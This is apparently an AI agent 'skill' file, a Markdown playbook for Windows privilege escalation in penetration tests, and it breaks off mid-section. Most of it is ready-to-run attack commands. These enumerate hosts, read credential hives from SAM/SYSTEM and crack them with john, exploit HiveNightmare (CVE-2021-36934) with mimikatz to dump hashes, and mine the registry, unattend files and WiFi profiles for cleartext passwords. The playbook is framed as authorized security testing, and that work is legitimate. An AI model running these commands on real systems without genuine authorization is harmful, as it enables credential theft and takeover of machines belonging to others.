---
name: Windows Privilege Escalation
description: This skill should be used when the user asks to "escalate privileges on Windows," "find Windows privesc vectors," "enumerate Windows for privilege escalation," "exploit Windows misconfigurations," or 
category: Security & Systems
source: antigravity
tags: [python, node, api, ai, workflow, document, image, security, vulnerability, aws]
url: https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/windows-privilege-escalation
---


# Windows Privilege Escalation

## Purpose

Provide systematic methodologies for discovering and exploiting privilege escalation vulnerabilities on Windows systems during penetration testing engagements. This skill covers system enumeration, credential harvesting, service exploitation, token impersonation, kernel exploits, and various misconfigurations that enable escalation from standard user to Administrator or SYSTEM privileges.

## Inputs / Prerequisites

- **Initial Access**: Shell or RDP access as standard user on Windows system
- **Enumeration Tools**: WinPEAS, PowerUp, Seatbelt, or manual commands
- **Exploit Binaries**: Pre-compiled exploits or ability to transfer tools
- **Knowledge**: Understanding of Windows security model and privileges
- **Authorization**: Written permission for penetration testing activities

## Outputs / Deliverables

- **Privilege Escalation Path**: Identified vector to higher privileges
- **Credential Dump**: Harvested passwords, hashes, or tokens
- **Elevated Shell**: Command execution as Administrator or SYSTEM
- **Vulnerability Report**: Documentation of misconfigurations and exploits
- **Remediation Recommendations**: Fixes for identified weaknesses

## Core Workflow

### 1. System Enumeration

#### Basic System Information
```powershell
# OS version and patches
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
wmic qfe

# Architecture
wmic os get osarchitecture
echo %PROCESSOR_ARCHITECTURE%

# Environment variables
set
Get-ChildItem Env: | ft Key,Value

# List drives
wmic logicaldisk get caption,description,providername
```

#### User Enumeration
```powershell
# Current user
whoami
echo %USERNAME%

# User privileges
whoami /priv
whoami /groups
whoami /all

# All users
net user
Get-LocalUser | ft Name,Enabled,LastLogon

# User details
net user administrator
net user %USERNAME%

# Local groups
net localgroup
net localgroup administrators
Get-LocalGroupMember Administrators | ft Name,PrincipalSource
```

#### Network Enumeration
```powershell
# Network interfaces
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address

# Routing table
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric

# ARP table
arp -A

# Active connections
netstat -ano

# Network shares
net share

# Domain Controllers
nltest /DCLIST:DomainName
```

#### Antivirus Enumeration
```powershell
# Check AV products
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName
```

### 2. Credential Harvesting

#### SAM and SYSTEM Files
```powershell
# SAM file locations
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM

# SYSTEM file locations
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system

# Extract hashes (from Linux after obtaining files)
pwdump SYSTEM SAM > sam.txt
samdump2 SYSTEM SAM -o sam.txt

# Crack with John
john --format=NT sam.txt
```

#### HiveNightmare (CVE-2021-36934)
```powershell
# Check vulnerability
icacls C:\Windows\System32\config\SAM
# Vulnerable if: BUILTIN\Users:(I)(RX)

# Exploit with mimikatz
mimikatz> token::whoami /full
mimikatz> misc::shadowcopies
mimikatz> lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
```

#### Search for Passwords
```powershell
# Search file contents
findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config

# Search registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Windows Autologin credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"

# PuTTY sessions
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# VNC passwords
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

# Search for specific files
dir /S /B *pass*.txt == *pass*.xml == *cred* == *vnc* == *.config*
where /R C:\ *.ini
```

#### Unattend.xml Credentials
```powershell
# Common locations
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml

# Search for files
dir /s *sysprep.inf *sysprep.xml *unattend.xml 2>nul

# Decode base64 password (Linux)
echo "U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo=" | base64 -d
```

#### WiFi Passwords
```powershell
# List profiles
netsh wlan show profile

# Get cleartext password
netsh wlan show profile <SSID> key=clear

# Extract all WiFi passwords
for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Key" | find /v "Number" & echo.) & @echo on
```

#### PowerShell History
```powe
